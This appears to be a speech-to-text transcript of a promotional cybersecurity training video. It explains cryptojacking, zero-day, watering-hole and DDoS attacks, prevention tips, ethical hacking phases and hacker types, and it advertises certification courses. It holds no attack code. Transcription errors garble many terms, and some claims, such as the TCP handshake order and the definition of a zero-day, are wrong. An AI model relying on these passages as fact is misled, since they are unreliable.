crypto jacking takes place when
attackers make their way into someone
else's computer to mine cryptocurrency
this is done by infecting a website or
by manipulating the victim to click on a
malicious link which in turn loads
crypto mining code on the computer
it is also done through online ads with
JavaScript code that will Auto execute
once loader in the victim's browser
victims are unaware of this as the
crypto mining code works in the
background the only sign they might
witness is a delay in the execution
crypto mining is a form of obtaining
cryptocurrency crypto mining by itself
is an immense process that is the reason
attackers make use of other computers in
order to crypto mine
let's have a look at ways to prevent
crypto jacking it is advised that you
keep all security apps and software
updated to the latest versions as crypto
tracking can infect the most unprotected
systems
it is also good to have a crypto
tracking awareness training and give
tips to employees as to how to detect
crypto jacking threats
make sure to inform them about the risks
of opening emails from unknown senders
and clicking on attachments
ads are a primary source of crypto
tracking scripts therefore it's good to
install an ad blocker and also have
extensions like minor block which is
used to detect and block crypto mining
Scripts
moving on to the number nine on our list
we have the zero day exploit
a zero-day exploit occurs after the
announcement of a network vulnerability
usually the Venter becomes aware of a
vulnerability but a solution to it is
still not available for the same hence
the vendor announces the vulnerability
so that the users are aware of it but
this also makes the attackers aware of
it
the vendor or the developer could take
any amount of time to find a solution it
could vary from a few hours to days to
months depending on the vulnerability in
the meantime the attackers Target the
disclosed vulnerability they exploit the
vulnerability even before a patch or a
solution is implemented
speaking of ways to prevent Zero D
exploit organizations should have a
well-communicated patch management
process it is also crucial to use
Management Solutions to automate the
procedures thus it avoids delays and
deployment
having an incident response plan helps
in dealing with a cider attack you need
to have a plan primarily looking into
zero-t attacks in case of an attack this
plan will keep you prepared and will
allow you to avoid or reduce the damage
finally at number 10 we have the
watering hole attack
generally in a watering hole attack the
victim is of a specific group it could
be either victims of an organization or
a region or so on
here the attacker targets the websites
which are frequently used by the
particular group they identify these
websites either by guesswork or by
closely monitoring the group
after which the attackers infect a few
of these websites with malware and
anyone who happens to visit the infected
website will have their computers
automatically loaded with malware this
attack loads the victim system with
malware similar to the fishing attack
the malware in such an attack talk its
personal information of the victim there
is also a possibility that the hacker
will actively take control of the
infected computer
let's have a look at how we can prevent
The Watering Hole attack
just like most other Cyber attack
prevention methods in this attack as
well it is strongly suggested that you
regularly update your software
by doing so you can reduce the risk of
this attack as this attack most often
exploits vulnerabilities
also make sure to regularly check for
any security patches
make use of your network security tools
to detect Watering Hole attacks
intrusion prevention systems work finely
when it comes to detecting a suspicious
Act
similarly you can conduct regular
Security checks using various network
security tools
to prevent a watering or attack it is
good to conceal your online activities
this can be done with the help of a VPN
and also through your browser's private
browsing feature
a virtual private Network often called a
VPN provides a secure connection to
another network over the Internet it
taxes a cover to your browsing activity
nordvpn is an example of a VPN that can
be used to provide a secure connection
so those were all about the different
types of cyber threats cyber security is
implemented in order to put a curve on
these cyber attacks cyber security
refers to the practice of protecting
networks computer systems and their
components from unauthorized digital
access
according to the Gartner forecast
worldwide it is stated that the
worldwide spending on cyber security is
forecasted to reach
133.7 billion dollars in 2022. and
according to the University of Maryland
hackers attack every 39 seconds that is
on an average
2244 times a day
although we had a look at multiple
methods to prevent a Cyber attack let's
once again have a look at a few personal
tips and ways in which you can prevent a
Cyber attack on the whole
firstly it is important you change your
passwords regularly and not only change
but use strong passwords that are
difficult to crack
do not have extremely complicated
passwords that you would tend to forget
rather use a password with at least
eight characters and preferably
alphanumeric also keep in mind not to
use the same password twice
next update both your operating system
and applications this will remove
vulnerabilities that hackers tend to
exploit make use of antivirus protection
software as they prevent malware and
other viruses from entering into your
device use antivirus software from
trusted and legitimate vendors only
make sure to use a firewall as it will
filter the traffic entering your device
use other network security tools such as
intrusion prevention systems Access
Control application security and so on
fourthly as mentioned in the earlier
section don't open emails from unknown
centers scrutinize the emails that you
receive and see where it comes from and
if there are any grammatical or format
errors
ideally it is good to make use of a VPN
by doing so the traffic is encrypted
between the VPN server and your device
this proves to be a protection for your
device
the next step is that you regularly back
up your data according to many Security
Professionals it is good to have three
copies of your data on two different
types of media and one copy in an
off-site location like a cloud storage
this way even if you witness a Cyber
attack you can erase your systems and
restore with a recently performed backup
next is that you should train your
employees inside the security principles
they should also be aware of the various
cyber threats and know how to tackle
them in case of any emergency
the next one is a crucial step and that
is to make sure to use two-factor or
multi-factor Authentication
normally by logging in you would enter
your user ID and password but with
two-factor authentication users are
required to provide two different
authentication factors to verify
themselves it could be an additional
personal identification code or maybe
even a fingerprint when you are asked
for more than two additional
authentication methods apart from your
username and password it is termed as a
multi-factor authentication thus it
proves to be a better step to secure
your account
make sure to always secure your Wi-Fi
networks the next point is that refrain
from using public Wi-Fi without using a
virtual private Network that is a VPN
finally it is also necessary that you
Safeguard your mobile as mobiles are
also a Cyber attack Target for this
purpose install apps from only trusted
and legitimate sources make sure to keep
your device updated
and there you go those were few of the
cyber security tips and ways to prevent
a Cyber attack let's start off with a
few interesting facts about DDOS attacks
cybercrime magazine stated that the
total number of DDOS attacks globally
are anticipated to double to 14.5
million by 2022. now that's a huge
number isn't it also given the current
situation with the covid-19 pandemic
every sector is operating virtually thus
the attacks are growing more
significantly than normally
do you know the financial brunter DDOS
attack courses once again according to
cyber crime magazine a denial of service
or a DDOS attack could cost up to 120
000 for a small company or more than 2
million dollars for a larger one with
financial loss even reputation gets
hampered there are a few industries that
are more susceptible to DDOS attacks and
according to the Cisco reports the
online gaming and the gambling industry
are a prime target
now let me talk about a few real-life
DDOS attacks that have happened in the
past
our first example is the DDOS attack
faced by Dime dime is an internet
performance management and web
application security company that was
acquired by Oracle in 2016.
on October 21st 2016 Dyne faced a
serious distributed denial of service
attacks that targeted systems operated
by DNS provider dime
the d ross attack lasted roughly for a
day with spikes coming in going up to
1.5 terabits per second
reports state that attack was carried
out using a weapon called the Mirai
botnet about 10 to 20 percent of all the
500 000 or so known Mirai Bots were
involved in addition to other devices
the findings reveal that Mirai was the
primary source of malicious attack
traffic
the attack affected a large number of
users in North America and Europe
several large businesses with high
traffic like Amazon Korra Airbnb HBO did
New York Times Twitter visa and CNN were
affected
our next example is Amazon web services
a subsidiary of Amazon which works on
providing on-demand cloud computing
platforms
in the month of February 2020 Amazon
stated that AWS Shield observed and
mitigated a 2.3 terabits per second DDOS
attack aw Shield a managed DDOS
Protection Service that is responsible
for safeguarding applications running on
AWS mitigated this attack
the attack was carried out using
hijacked CLW web servers and cost three
days of elevated threat for its AWS
Shield staff the DDOS attack had a peak
volume traffic of 2.3 terabits per
second which is the largest ever
recorded
detailing the attack in its q1 2020
threat report Amazon said its AWS Shield
service mitigated the largest DDOS
attack ever recorded stopping a 2.3
terabits per second attack in
mid-February this year now that we have
seen a few real-life tdos attacks let's
move on to understanding what exactly
Adidas attack is
you might have often come across the
word denial of service attack right so
is it the same as DDOS well they differ
with respect to a few parameters a
denial of service attack takes place
when a computer is used to flood the
target server or network with traffic by
doing so its resources and bandwidth are
exhausted the motive of the attack is to
deny normal legitimate service requests
and user access
as you can see in this image we have the
attacker's computer sending traffic to
the Target server here now let's speak a
bit about the DDOS attack
Adidas attack Works closely like a
denial of service attack the only
difference is that here multiple systems
are used to launch the attack you can
call d-ros attack as a large-scale
attack operation based on a denial of
service attack DDOS stands for
distributed denial of service here
several systems Target a single system
with malicious traffic when multiple
systems are used the attacker can put
the system offline more easily
Tito's attack is faster than a normal
denial of service attack and DDOS
attacks are difficult to trace
from this image you can see that
multiple systems are used to launch this
attack the systems together flood the
target system with massive traffic
now that we know what a DDOS attack is
let's try and understand the motive
Behind these attacks
the first reason can be guessed well by
all of you and that is for ransom just
like any other Cyber attack the primary
reason is monetary game a website owner
can be asked to pay a ransom for
attackers to stop a DDOS attack
The Ransom prices to stop the DDOS
attacks vary from small amounts to Hefty
amounts of money in most cases The
Ransom is usually charged in Bitcoins
the second reason is hacktivism or
protest hacktivism occurs with the
intention of spreading a message the aim
of this is to usually protest against an
ideology of a political agenda
the target of many activists and DDOS
attacks are government financial or
business websites
attackers launched DDOS attacks to shut
a website see for political reason thus
trying to make a statement
a person with a financial or an
ideological motive is capable to damage
an organization by launching a DDOS
attack against it
lastly these attacks can be carried out
for a specific reason called targeted
attacks for example it can be done to
damage an organization's reputation it
is to be noted that DDOS attacks can be
deployed against big or small sites and
can be driven by either competition or
pure burden or also for the need for the
challenge
the magnitude of these attacks can vary
from small to big
let's now move on and understand a
little more about the working of a DDOS
attack
an attacker is required to gain control
of a network of online machines in order
to carry out a DDOS attack
computers and various other iot devices
are infected with malware and these turn
into a pot also known as a zombie a
group of such Bots is called a botnet
once a botnet is created the attacker
takes over the remote control axis
Adidas is usually launched through a
network or remotely controlled Bots or
hacked computers botlets can range from
hundreds to thousands of computers
controlled by hackers it is possible
that your computer could be a part of a
botnet without even you knowing it
the next step is to Target the IP
address of the victim by the botnet once
this is done each bot will bombard the
target with fake service requests
the botnets send more connection
requests than a server can handle in
some cases they send huge volumes of
data that exceed the bandwidth range of
the victim
by doing so the targeted server or
network will overflow and thus resulting
in a denial of service to normal traffic
it is not possible to identify the bot
as it looks like a legitimate internet
device a successful DDOS attack slows a
website prevents users from accessing it
resulting in financial losses and
performance issues so now that you know
how a DDOS attack is carried out let's
have a look at the types of DDOS attacks
different DDOS attack vectors Target the
different components of a network
connection DDOS attacks can be divided
into three types they are volume based
attacks protocol attacks and application
layer attacks let's have a look at each
one of these attacks
first up we have the volume based DDOS
attack as the name suggests this attack
depends on the volume of the inbound
traffic to the Target this attack aims
at overloading the website's bandwidth
or causes usage issues it creates a
congestion by consuming all the
available bandwidth here massive volumes
of data are sent to the victim by using
a form of an application or request from
a botnet it is very simple the more the
volume the higher the success rate of
the attack the volume-based Eros attacks
include UDP floods ping that is icmp
floods and other spoofed packet floods
now let's have a look at an example of
the volume based attack that is the Ping
icmp flood attack the internet control
message protocol icmp which is utilized
in a pink flood attack is an internet
layer protocol used by network devices
to communicate and icmp flood attack
also known as spin flood attack is one
of the most common denial of service
attacks here the attacker overwhelms the
target device with icmp Eco requests
basically icmp Eco request and Eco reply
messages are used to Ping a network
device to check the connection between
the sender and the receiver an icmp
request requires resources and bandwidth
to process and reply to the requests
by flooding the target with request
packets the network is forced to respond
with an equal number of reply packets
thus making it unserviceable to normal
traffic attackers would usually spoof in
a bogus IP address in order to mask the
sending device the next type of DDOS
attack we will be discussing about is
the protocol-based attack
when you learn networking you will know
that the internet is based totally on a
set of protocols protocol attacks cause
a service disruption by consuming
intermediate communication equipment
like firewalls and load balancers DDOS
attacks based on protocols exploit
weaknesses in layer 3 and layer 4
Protocol Stacks protocol based attacks
exploit your network by sending either
more packets than what your server can
manage or more bandwidth than what your
network codes can hold
this attack includes sin floods ping of
death and Smurf DDOS to name a few
here we will have a look at an example
of the protocol-based attack that is the
sin flood attack
here the attack exploits the TCP
handshake in a regular tcpip Network
transaction there is a three-way
handshake namely the sin the
acknowledgment and the sin
acknowledgment the sin is a service
request the act that is also known as
the acknowledgment is a response from
the Target and the cell acknowledgment
is the original requester replying with
something like a thanks in return
whereas in the Sin flood attack the sin
packets are created with fake ID
addresses by the attackers the target as
per the protocol then sends an
acknowledgment to the dummy address
unfortunately this dummy address never
responds this was carried out a number
of times the target weights for the
final step in the handshake and in turn
it exhausts its resources in the process
next up we have the application layer
attack the main motor of this attack is
to bring down an online service or a
website these attacks are comparatively
smaller but silent
application layer attacks are also known
as layer 7 attacks and it not only
targets the application but also the
network and its bandwidth
application layer attacks include gets
and post plots low and slow attacks and
more let's have a look at the famous
HTTP flood attack as an example
HTTP flood is a type of distributed
denial of service attack in which the
attacker exploits legitimate looking
HTTP get or post requests to attack a
web server or an application here large
numbers of HTTP requests flood the
server resulting in denial of service
HTTP has generally two types of requests
get or post a get request is used to
retrieve information while a post
request is often used when submitting a
completed web form or when uploading a
file usually HTTP flood attacks are
harder to detect and block a HTTP flood
attack sends what appears to be
legitimate HTTP get or post requests to
attack a web server or an application
these flooding attacks often rely on a
botnet now that we had a look at the
types of DDOS attacks let's understand
the measures we need to take up in order
to prevent these attacks
the first step is to acquire more
bandwidth you must make sure that you
have ample bandwidth to handle any
spikes in traffic caused due to
malicious activity
currently with attackers being more
careful having more bandwidth races the
bar which the attackers have to overcome
before launching a successful DDOS
attack this is a good preventive step
next make sure to develop a DDOS
response plan ready usually when Adidas
attack takes place there is very less
time to plan hence it is wise certifying
a plan in advance as it will avoid and
minimize any impacts to do this job
first you would have to develop an
incident response plan also make sure
your data center is prepared and your
team knows what to do
the standard key elements include system
checklist forming a response team which
should include the list of internal and
external contacts as well
and the last being securing your network
infrastructure this can be done with the
help of ips that is intrusion prevention
systems which combine firewalls VPN load
balancing and other layers of DDOS
defense techniques
our third point is to configure Network
Hardware against an attack
at times small Hardware configuration
changes can help you prevent a DDOS
attack this is most often overlooked
also make sure to protect your DNS
servers as attackers can ringtone your
website and web servers offline by
attacking your DNS servers
next point is to Leverage The Cloud the
conventional DDOS mitigation Solutions
oversize the network bandwidth and
require complex Hardware which proves to
be costly and also ineffective whereas
cloud has greater bandwidth and
resources
cloud-based apps can absorb malicious
traffic way before it reaches its
intended destination therefore it is
good to Outsource DDOS prevention to
cloud-based service providers
our fifth Point involves monitoring your
website traffic regularly for unusual
activities
it is a great thing if your website gets
millions of new visitors in an hour but
isn't that also suspicious a sudden
increase in traffic is an alarming
situation hence have alerts set up in
the event you exceed a threshold
specific to the number of requests
targeting your site
considering the time and place of the
inbound traffic is also a good step
Adidas attack usually gives a few red
flags before it happens your team should
be wise enough to spot them beforehand
the signs of such an attack for example
will be your website being unresponsive
or responding slowly intermittent
website shutdowns or probably the user
having problems accessing the website if
these issues are prolonged then the
network is likely experiencing a tdos
and an action should be taken
immediately
the next step is to keep everything up
to date this might sound basic but it
goes a long way all the systems should
be kept up to date to make sure that any
issues or bugs are fixed it is always
good to detect threats at an early stage
finally you can make use of DDOS
prevention tools like in perva Cloud
Fair F5 Networks Albert DDOS and black
lotus to name a few
these tools are very effective for
example cloudfest layer 3 and 4
protection absorbs an attack before it
reaches the target server this is not
achievable by using firewalls load
balancers and routers
taking an example of Arbor DDOS it is to
be noted that it can deal with large
volumes of malicious traffic without
disrupting the regular traffic this
software is used to mostly protect
Enterprise or web hosting services
now let's have a look at something
interesting
we will speak a bit about the digital
attack map
as you see on your screens it is a data
visualization of DDOS attacks across the
world it is built through a
collaboration between Google ideas and
other networks you can have a look at it
and explore the various features it has
like which part of the world and when a
DDOS attack is happening you can also
get all the stats related to the attack
digital attack map lets you learn about
past Trends and find reports of outages
happening on a given day make sure to
check this out
now that you know all about a DDOS
attack and if you are interested in
becoming a cyber security expert and
want to work on designing security
systems and prevent cyber attacks then
simply learn can help you achieve your
dreams
simply learn provides a cyber security
expert master's program with
foundational intermediate and advanced
security skills through leading
certification courses including Security
Plus ceh cism cissp and ccsp
with the increasing number of job
opportunities in the field of cyber
security this certification course will
provide to be an advantage there are no
prerequisites for this program however
knowledge of any programming language is
recommended that again not mandatory
let's see how do we become a cyber
security expert so essentially who is a
cyber security expert a cyber security
expert is an individual employed by an
organization to protect their
infrastructure right so this person is
responsible to identify potential flaws
identify what threats the organization
faces and then streamline or create or
design or architect methodology which is
going to protect all the assets that the
organization has so this is going to
happen through a variety of techniques
such as finding weaknesses so
vulnerability management where you run
vulnerability scanners identify
potential flaws in the organization's
infrastructure could be applications
could be servers could be desktops could
be operating systems could be anything
could be network based flaws as well and
then you're going to monitor these
systems you're going to look at the data
flow that is going to the internet
through the network through the intranet
rather and then you're going to check if
there is anything malicious going on in
that Network so over these techniques
you're basically going to monitor it on
a day-to-day basis on a regular basis
and you're going to try to identify
anything out of the ordinary is
happening right after you find the
weakness you're going to test those
weaknesses to identify the complexity of
those weakness to validate those
weakness actually exist and then you're
going to repair them you're going to
patch them you're going to install
updates or you're going to prevent uh
you're going to install mechanisms like
firewalls or antiviruses to mitigate
those weaknesses and you're going to
thus resulting in strengthening the
areas where an attack may have occurred
let's see the domains in cyber security
now when we say domains in cyber
security in the previous slide we were
discussing where these attacks may
happen like applications infrastructure
Network so let's see these domains in
details asset security now when we say
assets assets could be applications
could be networking devices could be
computers could uh could be routers uh
could be wireless access points and
these uh all these devices have their
own operating systems they have their
own functionality and it is important
that we look at the security of each and
every asset that the organization owns
security architecture and engineering
now not everyone can just walk in an
organization and then say let's start
implementing as uh in implementing
Security in a particular manner we have
to standardize the security in such a
way where the security is constant for a
long period of time and is consistent
right so for that to happen there is an
architecture an engineering phase where
we are going to create a plan of how
this security needs to be implemented
for example if I determine mind to
install a particular antivirus I have to
ensure that the same antivirus is
installed on all the systems in the
organization I cannot have different
kind of antiviruses installed that do
not talk to each other or do not report
properly to the proper owner so we have
to create policies procedures and we
have to implement them in a standardized
manner for our security to work properly
communication and network security Now
with cloud computing coming in and
hybrid clouds happening where you've got
a deployment of a physical
infrastructure talking to something that
is on the cloud let's say AWS or
Microsoft Azure right and data flows are
happening globally these days you have
to be very careful how these data are
going to be transmitted across the
network thus you have to create those
paths and ensure that those parts are
monitored properly are regulated
properly and do not have any data
leakages similarly identity and access
management who is accessing my data are
they authorized to access my data and
yes how am I going to authenticate them
how am I going to track them home how am
I going to hold them accountable for
whatever they have done even if a person
is authorized to do something we have to
hold him accountable for that activity
so that if something something happens
later on we can identify who made that
change so the identity and access
management module will consist of us
creating groups policies users rules and
interlinking them with the assets to
ensure that only authorized people are
able to access those devices security
operations on a day-to-day basis we need
to monitor the security of the
organization for example if today I
start facing a denial of service attack
or somebody starts a password attack on
my organization where they're trying to
crack somebody's password there should
be some internal mechanisms that are in
place which will try to identify these
attacks want the appropriate
administrator and that administrator
will walk in and try to investigate that
attack so day to day operations are a
must security assessment and testing now
that we all have these mechanisms in
place are they going to remain constant
for the rest of our lives no it is an
Ever evolving scenario so we need to
assess and test our security controls on
a regular basis to ensure that there are
no gaps left what I configured today may
be irrelevant tomorrow so I have to
constantly keep on looking at the latest
security Trends the latest
vulnerabilities that are being
identified the patches that are being
installed and I have to compare my
infrastructure to all of these to see
that I am compliant with the latest
security standards software development
security so if you're an organization
who's developing software and who's
going to sell that software to end users
security becomes a huge part because the
end user the buyer if it is an
organization is going to ask what kind
of security testing was done in that
application so that brings us to a
software development life cycle which a
life cycle which talks about how your
going to create that code how you're
going to test that code ensure that the
code is secure enough so you need to
follow secure coding practices and
you're going to test the software over
and over again till you're satisfied
with the outcome and then security and
risk management now uh when we come to
risks risks are basically events that
may occur compromising the security of
an organization so it is very important
that we identify these risks we map
these risks we verify how that risk is
going to impact the business and then
try to figure out security controls to
mitigate that risk or bring it down to
manageable aspects so that's a lot of
talk that's a lot of domains that's a
lot of attacks that we have discussed
now let's see what kind of courses and
certifications are available for us to
enhance our careers and address all of
these domains all of these attacks so
starting off from a technical
perspective where we are going to look
at ethical hacking or security where we
are going to assess and do a
vulnerability assessment and penetration
test there are certifications from
CompTIA like Security Plus or from EC
Council which is the certified ethical
hacking training which basically allows
us to become vulnerability assessment
and penetration testing experts so we'll
be technically be testing each and every
device and trying to hack those devices
to see if that vulnerability is real and
what can be attained out of that
vulnerability cissp is very high level
is a very high level certification that
normally is considered as a management
level certification right so just to get
certified yourself you need at least
five years of experience in the IIT
security field this is where you get
certified and you're basically a chief
information security officer where
you're going to develop policies
procedures and security control
mechanisms and you're going to
standardize the security policy of the
entire organization then you've got the
cisa or also known as the sisa certified
Information Systems auditor it is from
an organization called Asaka it's more
on the system side where you're going to
audit systems and you're going to verify
that they are adhering to the policies
that you have implemented the cism or
system is the certified information
security manager this is again a
project-based oriented approach where
you're going to manage the security of
an organization and you're going to look
at all the daily operations of the
security Operation Center and you're
going to maintain and manage all of
those functions overall when we talked
about risk assessment and risk strategy
for that we've got the crisc which is a
certified in risk and information
systems control now for these
certifications this is more on the
business side of everything where you
and understand the business processes
you understand the business requirements
and based on those business requirements
you compare the technical
implementations of compute of computing
powers that you have implemented and
then you're going to compare how those
technical aspects can be converted into
a risk for example a vulnerability
assessment event identifies a possible
SQL injection attack now technically it
becomes technically it becomes a big
risk however which system has been being
affected if that system gets compromised
what kind of losses is the organization
looking at how much are they going to be
what kind of losses the organization are
looking at are they looking at lawsuits
from their customers are they looking at
penalties from regulatory authorities so
that risk that implied risk that this if
this vulnerability is hacked that is the
aspect that you want to look at when
you're looking at risk information and
controls similarly you have ccsp this is
a certified Cloud security professional
certification so this is especially for
people who want to deal with the cloud
uh let it be a public Cloud a private
cloud or a hybrid Cloud this
certification gives you an architectural
overview over different aspects of cloud
and how you want to implement Security
in a cloud-based scenario so simply
learn offers all of these certifications
with trainings from certified
professionals so there's a master's
program from Simply learn which talks
about becoming a cyber security expert
which includes all of these trainings
once you have these kind of trainings uh
and you get those certifications on your
profile that's where your basically a
Cyber Solutions or cyber security expert
and uh you'll be designing and
developing security policies structures
architectures for various organizations
and helping them uh enhance the security
of their infrastructure we humans are
highly tech savvy in today's times with
the extensive use of the internet and
modern Technologies there is a massive
challenge in protecting all our Digital
Data such as net banking information
account credentials and medical reports
to name a few have you heard about the
deadly Wanna Cry ransomware attack the
attack happened in May 2017 in Asia and
then it spread across the world within a
day more than 230 thousand computers
were infected across 150 countries the
wannacry cry cryptoworm encrypted the
data and locked the users out of their
systems for decryption of the data the
users were asked for a ransom of 300 to
600 in Bitcoin the users who use the
unsupported version of Microsoft Windows
and those who hadn't installed the
security update of April 2017 were
targeted in this attack the one a cry
attack took a toll on every sector
top-tier organizations like Hitachi
Nissan and FedEx had to put their
businesses on hold as their systems were
affected too now this is what you call a
Cyber attack to prevent such attacks
cyber security is implemented we can
Define cyber security as the practice of
protecting networks programs computer
systems and their components from
unauthorized digital attacks these
illegal attacks are often referred to as
hacking
hacking refers to exploiting weaknesses
in a computer network to obtain
unauthorized access to information a
hacker is a person who tries to hack
into computer systems this is a
misconception that hacking is always
wrong there are hackers who work with
different motives let's have a look at
three different types of hackers black
hat hackers are individuals who
illegally hack into a system for a
monetary gain on the contrary we have
white hat hackers who exploit the
vulnerabilities in a system by hacking
into it with permission in order to
defend the organization this form of
hacking is absolutely legal and ethical
hence they are also often referred to as
ethical hackers in addition to these
hackers we also have the gray hat
hackers as the name suggests the color
gray is a blend of both white and black
these hackers discover vulnerabilities
in a system and report it to the
system's owner which is a good act but
they do this without seeking the owner's
approval sometimes gray hat hackers also
ask for money in return for the spotted
vulnerabilities
now that you have seen the different
types of hackers let's understand more
about the hacking that is legal and
valid ethical hacking through an
interesting story Dan runs a Trading
Company he does online training with the
money his customers invest everything
was going well and Dan's business was
booming until a hacker decided to hack
the company's servers the hacker stole
the credentials of various trading
accounts he asked for a lump sum Ransom
in exchange for the stolen credentials
Dan took the Hacker's words lightly and
didn't pay the hacker as a result the
hacker withdrew money from various
customers accounts and Dan was liable to
pay back the customers Dan lost a lot of
money and also the trust of his
customers after this incident Dan gave a
lot of thought as to what could have
gone wrong with the security
infrastructure in his company he wished
there was someone from his company who
could have run a test attack to see how
vulnerable systems were before the
hacker penetrated into the network
this was when he realized he needed an
employee who thinks like a hacker and
identifies the vulnerabilities in his
Network before an outsider does to do
this job he hired an ethical hacker John
John was a skilled professional who
worked precisely like a hacker in no
time he spotted several vulnerabilities
in Dan's organization and closed all the
loopholes hiring an ethical hacker
helped Dan protect his customers from
further attacks in the future this in
turn increased the company's
productivity and guarded the company's
reputation
so now you know hacking is not always
bad John in this scenario exposed the
vulnerabilities in the existing Network
and such hacking is known as ethical
hacking ethical hacking is distributed
into six different phases let us look at
these faces step by step with respect to
how John our ethical hacker will act
before launching an attack the first
step Jon takes is to gather all the
necessary information about the
organization's system that he intends to
attack this step is called
reconnaissance he uses tools like nmap
and hping for this purpose John then
tries to spot the vulnerabilities if any
in the Target system using tools like in
map and Expos
this is the scanning phase
now that he has located the
vulnerabilities he then tries to exploit
them this step is known as gaining
access after John makes his way through
the organization's networks he tries to
maintain his access for future attacks
by installing back doors in the Target
system the Metasploit tool helps him
with this this phase is called
maintaining access
John is a brilliant hacker hence he
tries his best not to leave any evidence
of his attack this is the fifth phase
clearing tracks we now have the last
phase that is reported in this phase
John documents a summary of his entire
attack the vulnerabilities he spotted
the tools he used and the success rate
of the attack looking into the report
Dan is now able to take a call and see
how to protect his organization from any
external cyber attacks don't you all
think Jon is an asset to any
organization if you want to become an
ethical hacker like John then there are
a few skills that you need to acquire
first and foremost you need to have a
good knowledge of operating environments
such as Windows Linux Unix and Macintosh
you must have reasonably good knowledge
of programming languages such as HTML
PHP python SQL and JavaScript networking
is the base of ethical hacking hence you
should be good at it ethical hackers
should be well aware of security laws so
that they don't misuse their skills
finally you must have a global
certification on ethical hacking to
successfully bag a position of an
ethical hacker like John few examples of
ethical hacking certification are
certified ethical hacker certification
ceh CompTIA pin Test Plus and license
penetration tester certification to name
a few simply learn provides a cyber
security expert Masters program that
will equip you with all the skills
required by a cyber security expert you
could have a look at it by clicking the
link in the description the endless
growth of Technologies in this area is
directly proportional to the number of
cyber crimes cyber crimes are estimated
to cost 6 trillion dollars in 2021.
hence to tackle these cyber crimes
organizations are continuously on the
lookout for cyber Security Professionals
the average annual salary of a certified
ethical hacker is ninety one thousand
dollars in the US and approximately
rupees 7 lakhs in India so what are you
waiting for get certified and become an
ethical hacker like John and put an end
to the cyber attacks in the world so
let's talk about hacking and what
exactly hacking is hacking refers to
exploiting weaknesses in a computer
network to obtain unauthorized access to
information a hacker is a person who
tries to hack into computer systems now
here there are some keywords that we
need to understand first and foremost
exploit when you are exploiting
weaknesses weaknesses are technically
called vulnerabilities which are
basically design flaws misconfiguration
errors usage of default usernames and
passwords which have not been modified
so any misconfiguration or anything that
has been left behind by a Security
administrator that can be misused which
means exploited by a hacker to gain
unauthorized access so the next term is
unauthorized access something that you
are not allowed to do and when you say a
hacker is a person who tries to hack
it's basically a person with malicious
intent trying to gain access
to a system or a resource that they are
not authorized to access in the first
place how do they do it they find the
vulnerability that is a weakness or a
flaw and then they misuse it to gain
access to that particular Network so
here in the diagram you can see that a
sender on the left hand side is trying
to send some data to the receiver on the
right hand side the hacker would try to
gain unauthorized access to the
transmission that is being sent and
would try to capture the data packets
and read the secrets within let's look
at a business case scenario into hacking
now there is an organization everybody
is going around their own business when
they realize that their systems may have
been compromised now they're trying to
look at the customer data to ensure that
that has not been compromised Android
trying to assure you the customers
however they do realize that some
customer data has been lost and even the
company reports have been modified as
well now this is the scenario where
there have been some security controls
in place and those controls have been
identified they realize that there is an
attack that has happened and based on
the attack they have realized that the
data has now been compromised and the
records have been modified by the hacker
which means that the data is no longer
trustworthy and thus cannot be used by
the business for any legal transactions
so then the hacker gives a call to the
organization or gets connected to the
organization demanding your ransom for
the data to be replaced to be taken back
into the original state where it was
trusted and thus the organization can
utilize it for business transactions the
organization has probably no backup so
they decide that they want to pay the
lump sum to the hacker to restore that
data so that they can continue on with
the business does money exchanges and
the hacker is able to restore that data
and the business continues at as usual
however the activity here of a hacker
trying to Leverage The misconfiguration
of the weaknesses in the organization's
security thus being able to hack them
and make these ransomware demands so the
company then wants to figure out even if
having a security system in place how
was the hacker able to hack their
systems thus one of the employees comes
up with a brilliant idea of identifying
vulnerabilities in the network to
proactively search for any flaws that
have been left behind so that they can
plug those flaws and nobody can misuse
them thus they figure out that they want
to hire a ethical hacker who would help
them identify the security posture of
the organization identify the weaknesses
vulnerabilities and flaws and help them
remedy those flaws so that in future
scenarios these scenarios will not
happen so before we go into an ethical
hacker let's understand what are the
types of hackers so what are the types
of hackers hacker is a technically
skilled person who is very Adept with
computers they have good programming
skills they understand how operating
system works they understand how
networks work they understand how to
identify flaws and vulnerabilities
within all of these aspects and then
they understand and know how to misuse
these flaws to get a outcome which would
be detrimental to the health of the
organization
so there's six type of hackers that have
been identified black hat hackers white
hat hackers gray hat script kitties
Nations sponsored hackers and a hack
tourists so black hat hackers are
basically basically uh the malicious
hackers who have malicious intent and
have criminalistic Tendencies they want
to harm the organization by hacking into
their infrastructure by destroying their
infrastructure by destroying their data
so that they can gain from it from a
monetary perspective these guys are also
known as crackers the main aspect of
these people are that they have
malicious intent they try to do
unauthorized activities and they try it
for personal gain another important
aspect to remember is that a black hat
hacker will always try to hide their
identity uh they will spoof their online
digital identity by masking it by
spoofing their IP addresses Mac
addresses and try to remain anonymous on
the network a whitehead hacker on the
other hand is also an ethical hacker or
a security analyst who's an individual
who will do exactly the same thing that
a black hat hacker would do minus the
malicious intent plus the intent of
helping the organization identifying the
flaws and remedying them so that nobody
else can misuse those vulnerabilities so
they are authorized to act on the
company's behalf they are authorized to
do that activity which would help the
company identify those flaws and thus
help the company mitigate those flaws
improving on their security posture so
these uh these kind of Security Experts
or ethical hackers would help
organizations defend themselves against
unauthorized attacks gray hat hackers is
a blend of both white hat and black hat
hackers so here they can work
defensively and offensively both they
can accept contracts from organizations
to increase their security posture at
the same time they can also get
themselves involved in malicious
activities towards other organizations
to personally gain or benefit from them
by doing unauthorized activity script
kitties are people uh who are
technically not much aware about what
hacking is they rely on existing tools
that have been created by other hackers
they have no technical knowledge of what
they're doing it's just a hit or miss
for them so they just get their hands on
a tool they try to execute those tools
if the hack works it works otherwise it
doesn't so these people are basically
who are noobs or newbies who are trying
to learn hacking or uh just uh people
who with malicious intent who just want
to have some fun or trying to impress
people around then we have the nation or
the state-sponsored hackers as the name
suggests these hackers are sponsored by
their government now this may not be a
legitimate job but most of the
governments do have hackers enrolled in
their pay on um on their organizations
to spy on their enemies to spy on
various countries and try to figure out
uh the aspirations of those countries so
this is basically a spying activity
where you are technically trying to get
access to other countries resources and
then try to spy on them to figure out
what their activities have been or what
their future plans have been and then we
have the hacktivists who is an
individual who has a political agenda to
promote and they promote it by doing
hacking so these guys what is the
difference between a black hat hacker
and a hacktivist the black hat hacker
may try to hide their identity a
hacktivist will claim responsibility of
what they have done so for them it's a
political agenda a political cause and
they will try to hack various
organizations to promote their cause
they would probably do this by defacing
the website and posting the messages
that they want to promote on these
websites so what exactly is ethical
hacking then we have discussed the types
of hackers we have identified a
malicious hacker as a black hat hacker
